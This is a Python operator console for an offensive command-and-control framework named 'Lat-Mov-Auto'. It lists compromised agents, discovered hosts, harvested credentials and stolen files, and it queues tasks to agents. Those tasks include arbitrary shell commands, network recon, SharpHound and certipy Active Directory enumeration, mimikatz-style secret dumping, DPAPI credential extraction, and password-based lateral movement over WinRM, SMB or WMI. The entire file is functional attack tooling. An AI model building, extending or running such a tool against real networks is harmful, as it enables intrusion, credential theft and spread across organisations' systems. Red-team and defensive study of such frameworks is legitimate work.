#!/usr/bin/env python3
"""
Operator CLI for Lat-Mov-Auto C2.

Global mode:
  agents                      — list registered agents
  hosts                       — list recon-discovered hosts
  credentials                 — list harvested credentials
  loot                        — list uploaded files per agent
  results <agent_id>          — show task results for an agent
  interact <agent_id>         — enter interactive mode for that agent
  help                        — show this help
  exit / quit                 — exit the CLI

Interact mode  (prompt changes to [agent_id] >):
  <command>                                      — queue a shell task (default)
  shell <command>                                — queue a shell task (explicit)
  recon <ip_or_cidr>                             — queue a recon scan
  sharphound                                     — download + run SharpHound, upload ZIP
  certipy <args>                                 — download certipy.exe + run, upload output files (ADCS enum)
  secretsdump <tool> <args>                      — download tool + run (e.g. mimikatz.exe args)
  dpapi <tool> <args>                            — download tool + run (e.g. SharpDPAPI.exe args)
  authenticate -u <user> -p <pass> [-s <svc>] <target_ip>
                                                 — authenticate to a remote host using a native Windows service
                                                   auto-selects service from recon data (winrm / smb / wmi)
                                                   use -s to force a specific service
  results                                        — show task results for this agent
  back                                           — return to global mode
"""

import sys
import json
import time
import requests

SERVER = "http://127.0.0.1:8080"

# Ports that indicate a usable lateral movement service
LATERAL_PORTS = {5985: "winrm", 5986: "winrm", 445: "smb", 135: "wmi"}


# ── HTTP helpers ──────────────────────────────────────────────────────────────

def _get(path):
    try:
        r = requests.get(f"{SERVER}{path}", timeout=10)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print(f"[-] Cannot reach server at {SERVER}")
    except requests.exceptions.HTTPError as e:
        print(f"[-] HTTP {e.response.status_code}: {e.response.text}")
    except Exception as e:
        print(f"[-] {e}")
    return None


def _post(path, payload):
    try:
        r = requests.post(f"{SERVER}{path}", json=payload, timeout=10)
        r.raise_for_status()
        return r.json()
    except requests.exceptions.ConnectionError:
        print(f"[-] Cannot reach server at {SERVER}")
    except requests.exceptions.HTTPError as e:
        print(f"[-] HTTP {e.response.status_code}: {e.response.text}")
    except Exception as e:
        print(f"[-] {e}")
    return None


# ── Result polling ───────────────────────────────────────────────────────────

def _wait_for_result(agent_id, task_id, timeout=120, poll=2):
    """Poll until task_id appears in results, then print output. Timeout in seconds."""
    print(f"[*] Waiting for result (task {task_id})...", flush=True)
    deadline = time.time() + timeout
    while time.time() < deadline:
        rows = _get(f"/results/{agent_id}")
        if rows:
            for r in rows:
                if r["task_id"] == task_id:
                    print()
                    output = r["output"]
                    try:
                        parsed = json.loads(output)
                        output = json.dumps(parsed, indent=2)
                    except Exception:
                        pass
                    for line in output.splitlines():
                        print(f"  {line}")
                    return
        time.sleep(poll)
    print(f"\n[-] Timed out waiting for task {task_id} result")


# ── Display helpers ───────────────────────────────────────────────────────────

def _print_agents(rows):
    if not rows:
        print("  (no agents registered)")
        return
    print(f"  {'AGENT ID':<36}  {'HOSTNAME':<20}  {'USER':<20}  LAST SEEN")
    print("  " + "-" * 95)
    for r in rows:
        print(f"  {r['agent_id']:<36}  {r['hostname']:<20}  {r['username']:<20}  {r['last_seen']}")


def _print_results(rows):
    if not rows:
        print("  (no results yet)")
        return
    for r in rows:
        print(f"\n  [task {r['task_id']}] [{r['task_type']}] {r['instruction']}")
        print(f"  received: {r['received_at']}")
        print("  " + "-" * 60)
        output = r["output"]
        try:
            parsed = json.loads(output)
            output = json.dumps(parsed, indent=2)
        except Exception:
            pass
        for line in output.splitlines():
            print(f"  {line}")


def _print_hosts(rows):
    if not rows:
        print("  (no hosts discovered)")
        return
    print(f"  {'IP':<16}  {'HOSTNAME':<30}  OPEN PORTS")
    print("  " + "-" * 75)
    for r in rows:
        print(f"  {r['ip']:<16}  {r.get('hostname',''):<30}  {r.get('open_ports','')}")


def _print_credentials(rows):
    if not rows:
        print("  (no credentials stored)")
        return
    print(f"  {'USERNAME':<30}  {'TYPE':<12}  {'SOURCE':<20}  SECRET")
    print("  " + "-" * 90)
    for r in rows:
        secret_preview = r["secret"][:40] + ("..." if len(r["secret"]) > 40 else "")
        print(f"  {r['username']:<30}  {r['cred_type']:<12}  {r['source_host']:<20}  {secret_preview}")


def _print_loot(data):
    if not data:
        print("  (no loot)")
        return
    for agent_id, files in data.items():
        print(f"  {agent_id}:")
        for f in files:
            print(f"    - {f}")


# ── Authenticate helpers ──────────────────────────────────────────────────────

def _parse_auth_args(arg):
    """Parse: -u user -p password [-s service] target  →  (username, password, target, service|None)"""
    tokens = arg.split()
    username = password = target = service = None
    i = 0
    while i < len(tokens):
        if tokens[i] == "-u" and i + 1 < len(tokens):
            username = tokens[i + 1]; i += 2
        elif tokens[i] == "-p" and i + 1 < len(tokens):
            password = tokens[i + 1]; i += 2
        elif tokens[i] == "-s" and i + 1 < len(tokens):
            service = tokens[i + 1].lower(); i += 2
        else:
            target = tokens[i]; i += 1
    return username, password, target, service


def _services_for_target(target_ip):
    """
    Look up target_ip in the hosts table and return the list of lateral movement
    services available based on open ports.
    Returns [] if the host is known but no lateral ports are open.
    Returns None if the host is not in the DB at all.
    """
    hosts = _get("/hosts")
    if not hosts:
        return None
    for h in hosts:
        if h["ip"] == target_ip:
            open_ports = [int(p) for p in h.get("open_ports", "").split(",") if p.strip().isdigit()]
            services = []
            for port in open_ports:
                svc = LATERAL_PORTS.get(port)
                if svc and svc not in services:
                    services.append(svc)
            return services
    return None  # not found in DB


# ── Global commands ───────────────────────────────────────────────────────────

def handle_global(line):
    """Returns (new_agent_id | None) if we should switch to interact mode."""
    parts = line.split(None, 1)
    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if cmd in ("exit", "quit"):
        print("bye.")
        sys.exit(0)

    elif cmd == "help":
        print(__doc__)

    elif cmd == "agents":
        rows = _get("/agents")
        if rows is not None:
            _print_agents(rows)

    elif cmd == "hosts":
        rows = _get("/hosts")
        if rows is not None:
            _print_hosts(rows)

    elif cmd == "credentials":
        rows = _get("/credentials")
        if rows is not None:
            _print_credentials(rows)

    elif cmd == "loot":
        data = _get("/loot")
        if data is not None:
            _print_loot(data)

    elif cmd == "results":
        if not arg:
            print("usage: results <agent_id>")
        else:
            rows = _get(f"/results/{arg}")
            if rows is not None:
                _print_results(rows)

    elif cmd == "interact":
        if not arg:
            print("usage: interact <agent_id>")
            return None
        # Verify agent exists
        agents = _get("/agents")
        if agents is None:
            return None
        ids = [a["agent_id"] for a in agents]
        if arg not in ids:
            print(f"[-] Agent '{arg}' not found. Known agents:")
            _print_agents(agents)
            return None
        print(f"[*] Entering interact mode for {arg}  (type 'back' to return)")
        return arg

    else:
        print(f"[-] Unknown command: {cmd}  (type 'help' for usage)")

    return None


# ── Interact commands ─────────────────────────────────────────────────────────

def handle_interact(line, agent_id):
    """Returns True to stay in interact mode, False to go back to global."""
    parts = line.split(None, 1)
    cmd = parts[0].lower()
    arg = parts[1] if len(parts) > 1 else ""

    if cmd == "back":
        print("[*] Returning to global mode")
        return False

    elif cmd in ("exit", "quit"):
        print("bye.")
        sys.exit(0)

    elif cmd == "results":
        rows = _get(f"/results/{agent_id}")
        if rows is not None:
            _print_results(rows)

    elif cmd == "recon":
        if not arg:
            print("usage: recon <ip_or_cidr>")
        else:
            res = _post("/recon", {"agent_id": agent_id, "target": arg})
            if res:
                print(f"[+] Recon task queued — task_id: {res['task_id']}")
                _wait_for_result(agent_id, res["task_id"])

    elif cmd == "sharphound":
        res = _post("/task", {"agent_id": agent_id, "task_type": "sharphound", "instruction": arg or ""})
        if res:
            print(f"[+] SharpHound task queued — task_id: {res['task_id']}")
            _wait_for_result(agent_id, res["task_id"], timeout=300)

    elif cmd == "certipy":
        if not arg:
            print("usage: certipy <args>  (e.g. certipy find -u user@domain -p Pass -dc-ip 10.0.0.1)")
        else:
            res = _post("/task", {"agent_id": agent_id, "task_type": "certipy", "instruction": arg})
            if res:
                print(f"[+] Certipy task queued — task_id: {res['task_id']}")
                _wait_for_result(agent_id, res["task_id"], timeout=120)

    elif cmd == "secretsdump":
        if not arg:
            print("usage: secretsdump <toolname.exe> [args...]")
        else:
            res = _post("/task", {"agent_id": agent_id, "task_type": "secretsdump", "instruction": arg})
            if res:
                print(f"[+] Secretsdump task queued — task_id: {res['task_id']}")
                _wait_for_result(agent_id, res["task_id"], timeout=120)

    elif cmd == "dpapi":
        if not arg:
            print("usage: dpapi <toolname.exe> [args...]")
        else:
            res = _post("/task", {"agent_id": agent_id, "task_type": "dpapi", "instruction": arg})
            if res:
                print(f"[+] DPAPI task queued — task_id: {res['task_id']}")
                _wait_for_result(agent_id, res["task_id"], timeout=120)

    elif cmd == "authenticate":
        if not arg:
            print("usage: authenticate -u <user> -p <pass> [-s winrm|smb|wmi] <target_ip>")
        else:
            username, password, target, service = _parse_auth_args(arg)

            if not username or not password or not target:
                print("[-] Missing arguments. usage: authenticate -u <user> -p <pass> [-s winrm|smb|wmi] <target_ip>")
            else:
                # If service not forced, resolve it from recon data
                if not service:
                    available = _services_for_target(target)

                    if available is None:
                        print(f"[-] No recon data for {target} — run 'recon' first or specify a service with -s [winrm|smb|wmi]")
                    elif len(available) == 0:
                        print(f"[-] No lateral movement ports found for {target} in recon data")
                    elif len(available) == 1:
                        service = available[0]
                        print(f"[*] {service.upper()} detected on {target} — using {service}")
                    else:
                        svcs = ", ".join(available)
                        print(f"[*] Multiple services available on {target}: {svcs}")
                        print(f"[!] Please specify a service: authenticate -u {username} -p <pass> -s [{' | '.join(available)}] {target}")
                        service = None  # abort, let operator retry with -s

                if service:
                    instruction = f"{username}|{password}|{target}|{service}"
                    res = _post("/task", {"agent_id": agent_id, "task_type": "authenticate", "instruction": instruction})
                    if res:
                        print(f"[+] Authenticate task queued — task_id: {res['task_id']}")
                        _wait_for_result(agent_id, res["task_id"], timeout=30)

    elif cmd == "shell":
        command = arg if arg else ""
        if not command:
            print("usage: shell <command>")
        else:
            res = _post("/task", {"agent_id": agent_id, "task_type": "shell", "instruction": command})
            if res:
                print(f"[+] Shell task queued — task_id: {res['task_id']}")
                _wait_for_result(agent_id, res["task_id"])

    else:
        # Default: treat the whole line as a shell command
        res = _post("/task", {"agent_id": agent_id, "task_type": "shell", "instruction": line})
        if res:
            print(f"[+] Shell task queued — task_id: {res['task_id']}")
            _wait_for_result(agent_id, res["task_id"])

    return True


# ── Main REPL ─────────────────────────────────────────────────────────────────

def main():
    current_agent = None
    print(f"[*] Lat-Mov-Auto operator CLI  (server: {SERVER})")
    print("[*] Type 'help' for usage.\n")

    while True:
        try:
            prompt = f"[{current_agent}] > " if current_agent else "[C2] > "
            line = input(prompt).strip()
        except (KeyboardInterrupt, EOFError):
            print("\nbye.")
            sys.exit(0)

        if not line:
            continue

        if current_agent:
            stay = handle_interact(line, current_agent)
            if not stay:
                current_agent = None
        else:
            result = handle_global(line)
            if result:
                current_agent = result


if __name__ == "__main__":
    main()
